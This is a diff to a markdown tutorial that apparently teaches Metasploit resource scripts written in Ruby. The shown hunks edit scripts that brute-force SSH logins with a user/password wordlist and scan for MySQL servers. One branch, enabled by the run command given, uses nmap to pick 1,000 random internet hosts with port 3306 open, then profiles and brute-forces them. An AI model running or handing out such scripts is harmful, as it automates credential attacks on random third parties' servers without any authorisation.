@@ -456,7 +456,6 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
      run_single("services -d")
      run_single("hosts -d")
-     run_single("exit -y")
    </ruby>
 ```
 **[in terminal]::Run the script::** `msfconsole -r /root/brute_force.rc`
@@ -496,11 +495,11 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
          run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
       end
-      if (framework.datastore['RANDOM_HOSTS'] == nil or framework.datastore['RANDOM_HOSTS'] == '')
-         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse,mysql-databases.nse,mysql-audit.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
+      if (framework.datastore['RANDOM_HOSTS'] == 'true')
+         run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
       else
-         print_warning("db_nmap: search for random targets with port: 3306 open (mysql)")
-         run_single("db_nmap -T4 -iR 1000 -Pn --script=banner.nse,mysql-info.nse -p 3306 --open")
+         print_warning("db_nmap: search for random targets with port 3306 open (mysql)")
+         run_single("db_nmap -sV -Pn -T4 -iR 1000 --script=mysql-info.nse,ip-geolocation-geoplugin.nse -p 3306 --open")
       end
 
       run_single("services")
@@ -552,7 +551,6 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
        Rex::sleep(1.0)
        run_single("services -d")
        run_single("hosts -d")
-       run_single("back")
 </ruby>
 ```
 **[in terminal]::Run the script::** `msfconsole -q -x 'setg RANDOM_HOSTS true; resource /root/mysql_brute.rc'`
